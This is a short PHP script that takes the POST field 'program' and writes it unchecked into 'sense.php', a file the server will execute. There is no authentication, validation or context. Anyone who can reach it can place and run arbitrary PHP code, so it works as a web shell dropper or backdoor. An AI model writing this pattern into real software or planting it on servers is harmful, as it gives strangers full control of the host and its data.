<?php
$myfile = fopen("sense.php", "w") or die("Unable to open file!");
$txt = $_POST["program"];
fwrite($myfile, $txt);
fclose($myfile);
?>